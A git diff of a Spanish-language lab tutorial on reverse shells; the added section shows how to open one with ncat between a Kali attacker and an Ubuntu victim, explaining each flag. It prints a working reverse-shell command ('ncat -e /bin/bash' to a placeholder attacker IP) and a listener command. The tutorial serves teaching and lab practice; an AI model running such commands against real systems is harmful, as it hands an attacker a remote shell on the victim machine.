@@ -31,7 +31,7 @@ nc, abreviatura de Netcat, es una herramienta de red versátil conocida como el 
 - ncat: Ncat es una herramienta de red mejorada y más segura que es parte del proyecto Nmap. Ofrece funcionalidades similares a Netcat, pero con características adicionales como el cifrado SSL para conexiones seguras, autenticación fácil, y la capacidad de manejar simultáneamente múltiples conexiones. Ncat es versátil para la depuración de redes, exploración, y como un componente en scripts de pruebas de seguridad. Su diseño moderno y las mejoras de seguridad lo hacen una elección preferente para profesionales de la seguridad informática.
 - Socat: Es una herramienta de línea de comandos que permite el establecimiento de dos flujos de datos bidireccionales. Es similar a Netcat pero más complejo y potente, ofreciendo características como la creación de túneles seguros, la transferencia de datos entre diferentes protocolos (por ejemplo, TCP, UDP, UNIX sockets), y la posibilidad de ejecutar scripts o comandos a través de su conexión. Socat es ampliamente utilizado por administradores de sistemas y profesionales de seguridad para diagnósticos de red, pruebas, y como un potente instrumento para diversas tareas de red.
 
-#### Ejemplo con netcat
+#### 1.1 Ejemplo con netcat
 Para obtner la shell reversa, usaremos netcat tanto en el atacante (kali) como en la víctima (ubuntu):
 - En la máquina atacante (Kali), iniciamos Netcat en modo escucha especificando un puerto:
   ```
@@ -62,7 +62,7 @@ Para obtner la shell reversa, usaremos netcat tanto en el atacante (kali) como e
 Recomendación: Ver Exploring mkfifo / nc Reverse Shell ➡ https://www.youtube.com/watch?v=_q_ZCy-hEqg
 
 
-#### Ejemplo con bash
+#### 1.2 Ejemplo con bash
 Usaremos bash en la máquina víctima para obtener la shell reversa:
 - En la máquina atacante se utilizará necat en modo escucha, igual que en el punto anterior:
   ```
@@ -81,3 +81,36 @@ Usaremos bash en la máquina víctima para obtener la shell reversa:
   ![](capturas/shell-reversa-bash-mv-atacante.png)
 
 Recomendación: Ver Exploring bash Reverse Shell ➡ https://www.youtube.com/watch?v=OjkVep2EIlw
+
+
+**Nota:** Es interesante apreciar los diferentes promopts de las dos shells reversas.
+
+#### 1.3 Ejemplo con ncat
+El comando ncat es una versión mejorada y más segura de Netcat, incluida en la suite de herramientas Nmap.
+
+- En el Servidor de Ataque (Escucha): En el "servidor de ataque" debemos configurar ncat para que escuche en un puerto específico. Esto se hace para esperar una conexión entrante desde la máquina objetivo.
+```
+ncat -lnvp 4444
+```
+Explicación de los parámetros:
+-l indica a ncat que escuche conexiones entrantes.
+-n le dice a ncat que no resuelva los nombres de host, lo que acelera el proceso.
+-v activa el modo verboso, lo que significa que mostrará más detalles sobre la conexión.
+-p 4444 especifica el puerto en el que ncat estará escuchando. Puedes elegir otro puerto si lo prefieres.
+![](capturas/shell-reversa-ncat-mv-atacante.png)
+  
+- En la Máquina Víctima: Necesitamos ejecutar un comando que intente conectarse al servidor de ataque y establezca la shell reversa. La elección del comando puede depender del sistema operativo de la máquina objetivo y de las herramientas disponibles.
+```
+ncat -e /bin/bash IP_DEL_SERVIDOR_DE_ATAQUE 4444
+```
+Explicación de los parámetros:
+-e /bin/bash le dice a ncat que ejecute /bin/bash y envíe su entrada/salida a través de la conexión de red, estableciendo así una shell reversa.
+![](capturas/shell-reversa-ncat-mv-victima.png)
+
+Debemos de tener en cuenta:
+- Transmitir una shell sin cifrar a través de la red puede ser peligroso y exponer información sensible. La herramienta ncat ofrece la opción de establecer conexiones cifradas utilizando el parámetro --ssl para mejorar la seguridad.
+- La herramienta ncap debe estar instalada tanto en la máquina víctima como en la atacante.
+
+
+
+
